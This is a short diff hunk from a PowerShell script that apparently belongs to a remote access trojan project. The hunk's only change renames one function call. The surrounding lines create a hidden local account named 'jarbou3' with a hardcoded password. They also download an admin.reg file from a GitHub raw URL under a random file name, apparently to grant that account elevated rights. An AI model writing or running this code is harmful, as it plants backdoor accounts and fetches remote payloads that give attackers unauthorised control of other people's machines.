@@ -45,7 +45,7 @@ Write-Output "" > poc.txt
 
 $NewName = "jarbou3"
 $Password = (ConvertTo-SecureString "jarbou3" -AsPlainText -Force)
-Create-Account -NewName $NewName -Password $Password
+create_account -NewName $NewName -Password $Password
 
 $reg_file = random_text
 Invoke-WebRequest -Uri https://raw.githubusercontent.com/riahifiras/RAT/main/files/admin.reg -OutFile "$reg_file.reg"
